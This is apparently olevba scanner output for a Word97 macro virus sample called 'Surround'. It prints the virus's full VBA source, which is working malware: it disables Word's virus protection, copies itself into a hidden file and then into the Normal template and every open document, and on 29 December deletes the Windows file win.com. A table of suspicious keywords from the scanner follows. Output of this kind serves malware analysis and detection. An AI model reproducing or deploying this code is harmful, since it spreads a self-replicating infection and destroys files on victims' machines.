olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-79286b3d2e0412eab134657faa9d5abefd1a76bb
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-79286b3d2e0412eab134657faa9d5abefd1a76bb 
in file: Virus.MSOffice.Source-79286b3d2e0412eab134657faa9d5abefd1a76bb - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
'Word97.Surround by Necronomikon/ShadowvX
    CreateKey
    DefaultOptions
    InsertInNormal
    InsertInActive
End Sub

Sub AutoNew()
On Error Resume Next
    InsertInActive
End Sub

Sub DefaultOptions()
On Error Resume Next
    Options.VirusProtection = False
    Options.BackgroundSave = True
    Options.SaveNormalPrompt = False
End Sub

Sub AutoExec()
On Error Resume Next
    DefaultOptions
    If Month(Date) = 12 And Day(Date) = 29 Then
        Kill "C:\WIN*\win.com"
        e = MsgBox("You are now Surrounded!!", vbCritical + vbSystemModal, "Virus information", "", 0)
    End If
End Sub

Sub CreateKey()
On Error Resume Next
    For Each component In ActiveDocument.VBProject.VBComponents
        If component.Name = "Surround" Then
            component.Export ("C:\Surround.key")
            SetAttr "C:\Surround.key", vbHidden + vbSystem
        End If
    Next component
End Sub

Sub InsertInNormal()
On Error Resume Next
    For Each component In NormalTemplate.VBProject.VBComponents
        If component.Name = "Surround" Then Exit Sub
    Next component
    If Day(Date) = 21 Then
        Beep
    End If
    NormalTemplate.VBProject.VBComponents.Import ("C:\Surround.key")
End Sub

Sub InsertInActive()
On Error Resume Next
    For Each component In ActiveDocument.VBProject.VBComponents
        If component.Name = "Surround" Then Exit Sub
    Next component
    ActiveDocument.VBProject.VBComponents.Import ("C:\Surround.key")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

